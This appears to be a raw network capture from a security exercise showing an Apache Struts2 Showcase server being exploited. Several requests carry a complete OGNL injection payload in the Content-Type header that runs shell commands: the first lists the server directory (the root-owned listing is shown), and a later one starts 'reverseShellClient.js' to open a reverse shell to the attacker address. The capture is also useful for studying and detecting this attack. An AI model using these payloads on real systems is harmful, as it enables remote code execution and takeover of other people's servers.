+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp;jsessionid=C5E4447F493FB0164CE6E22A0A7FF05C">DateTime picker tag - Pick a time</a></li>
+.........
+........
+
+T 192.168.33.20:57870 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -la').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37901 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -la').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37901 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:50:59 GMT.
+Connection: close.
+.
+43e.
+total 12684
+drwxr-sr-x 18 root staff     4096 Jan 19 04:46 .
+drwxrwsr-x 21 root staff     4096 Jan 19 03:54 ..
+-rw-r--r--  1 root root     56846 Sep 29 12:27 LICENSE
+-rw-r--r--  1 root root      1239 Sep 29 12:27 NOTICE
+-rw-r--r--  1 root root      8965 Sep 29 12:27 RELEASE-NOTES
+-rw-r--r--  1 root root     16195 Sep 29 12:27 RUNNING.txt
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 bin
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 conf
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 include
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 lib
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 logs
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 native-jni-lib
+drwxr-sr-x  7 root root      4096 Jan 19 03:54 node_modules
+-rwx------  1 root staff     1171 Dec 28 17:03 reverseShellClient.js
+-rw-r--r--  1 root staff 12828110 Mar  6  2013 struts2-showcase-2.3.12.war
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 temp
+-rw-r--r--  1 root staff    15019 Jan 19 03:55 velocity.log
+drwxr-xr-x  8 root root      4096 Jan 19 03:54 webapps
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 work
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57870 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:50:59 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+43e.
+total 12684
+drwxr-sr-x 18 root staff     4096 Jan 19 04:46 .
+drwxrwsr-x 21 root staff     4096 Jan 19 03:54 ..
+-rw-r--r--  1 root root     56846 Sep 29 12:27 LICENSE
+-rw-r--r--  1 root root      1239 Sep 29 12:27 NOTICE
+-rw-r--r--  1 root root      8965 Sep 29 12:27 RELEASE-NOTES
+-rw-r--r--  1 root root     16195 Sep 29 12:27 RUNNING.txt
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 bin
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 conf
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 include
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 lib
+drwxr-xr-x  2 root root      4096 Jan 19 03:54 logs
+drwxr-sr-x  3 root staff     4096 Jan 18 21:12 native-jni-lib
+drwxr-sr-x  7 root root      4096 Jan 19 03:54 node_modules
+-rwx------  1 root staff     1171 Dec 28 17:03 reverseShellClient.js
+-rw-r--r--  1 root staff 12828110 Mar  6  2013 struts2-showcase-2.3.12.war
+drwxr-xr-x  2 root root      4096 Jan 18 21:12 temp
+-rw-r--r--  1 root staff    15019 Jan 19 03:55 velocity.log
+drwxr-xr-x  8 root root      4096 Jan 19 03:54 webapps
+drwxr-xr-x  3 root root      4096 Jan 19 03:54 work
+.
+
+
+T 192.168.33.1:56616 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+Host: target.cyexc-target.
+Accept: */*.
+Cookie: JSESSIONID=8B2D9A1FB24A22C9E3DD94CCF8B9DA7F.
+User-Agent: Bear/5767 CFNetwork/893.13.1 Darwin/17.3.0 (x86_64).
+Accept-Language: ja-jp.
+Accept-Encoding: gzip, deflate.
+Connection: keep-alive.
+.
+
+
+T 192.168.1.100:37902 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+Accept: */*.
+Cookie: JSESSIONID=8B2D9A1FB24A22C9E3DD94CCF8B9DA7F.
+User-Agent: Bear/5767 CFNetwork/893.13.1 Darwin/17.3.0 (x86_64).
+Accept-Language: ja-jp.
+Accept-Encoding: gzip, deflate.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37902 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:51:21 GMT.
+Connection: close.
+.
+2000.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanNonAjax.action">Hangman (Non Ajax)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanAjax.action">Hangman (Ajax - Experimental)</a></li>
+........</ul>
+.......</li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/empmanager/index.jsp">CRUD</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/wait/index.jsp">Execute &amp; Wait</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/token/index.jsp">Token</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/validation/index.jsp">Validation</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/modelDriven/modelDriven.action">Model Driven</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Integration<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Freemarker</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/freemarker/customFreemarkerManagerDemo.action">Demo of usage of a Custom Freemarker Manager</a>
+.........</li>
+.........<.
+9ad.
+li>
+..........
+..........<a href="/struts2-showcase-2.3.12/freemarker/standardTags.action">Demo of Standard Struts Freemarker Tags</a>
+.........</li>
+........</ul>
+.......</li>
+.......<li><a href="/struts2-showcase-2.3.12/jsf/index.jsp">JavaServer Faces</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/i
+
+T 192.168.1.100:80 -> 192.168.33.1:56616 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:51:21 GMT.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+.
+1f4c.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanNonAjax.action">Hangman (Non Ajax)</a></li>
+.........<l
+
+T 192.168.33.20:57871 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='nodejs reverseShellClient.js -i 192.168.33.20').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37903 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Fo
